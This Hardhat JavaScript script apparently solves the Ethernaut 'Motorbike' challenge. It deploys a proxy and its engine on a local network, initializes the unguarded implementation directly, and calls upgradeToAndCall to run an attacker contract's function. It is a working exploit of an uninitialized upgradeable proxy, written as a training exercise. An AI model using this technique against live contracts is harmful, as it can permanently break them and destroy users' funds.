const {
    network,
    ethers
} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const [deployer, attacker] = await ethers.getSigners()
    const deployerAddr = await deployer.getAddress()
    const attackerAddr = await attacker.getAddress()
    console.log("deployer address = ", deployerAddr, "attacker address = ", attackerAddr)

    // deplay the contract
    const engineContract = await ethers.deployContract("Engine")
    const engineAddr = await engineContract.getAddress()
    console.log("engine address = ", engineAddr)

    const motorbikeContract = await ethers.deployContract("Motorbike", [engineAddr])
    const motorbikeAddr = await motorbikeContract.getAddress()
    console.log("motor bike address = ", motorbikeAddr)

    {
        const executeionTx = await motorbikeContract.execution(1)
        await ethers.provider.getTransactionReceipt(executeionTx.hash).then((receipt) => {
            console.log("tx receipt = ", receipt)
        })
    }

    //
    const initializeTx = await engineContract.initialize()
    await ethers.provider.getTransactionReceipt(initializeTx.hash).then((receipt) => {
        console.log("tx receipt = ", receipt)
    })

    const attackContract = await ethers.deployContract("Attack")
    const attackAddr = await attackContract.getAddress()
    console.log("attack address = ", attackAddr)

    const executionFunctionName = "execution"
    const AttackerInterface = new ethers.Interface([
        "function execution() public"
    ])
    const executionParams = []
    const data = AttackerInterface.encodeFunctionData(executionFunctionName, executionParams)

    const upgradeTx = await engineContract.upgradeToAndCall(attackAddr, data)
    await ethers.provider.getTransactionReceipt(upgradeTx.hash).then((receipt) => {
        console.log("tx receipt = ", receipt)
    }) 

    {
        const executeionTx = await motorbikeContract.execution(1)
        await ethers.provider.getTransactionReceipt(executeionTx.hash).then((receipt) => {
            console.log("tx receipt = ", receipt)
        })
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});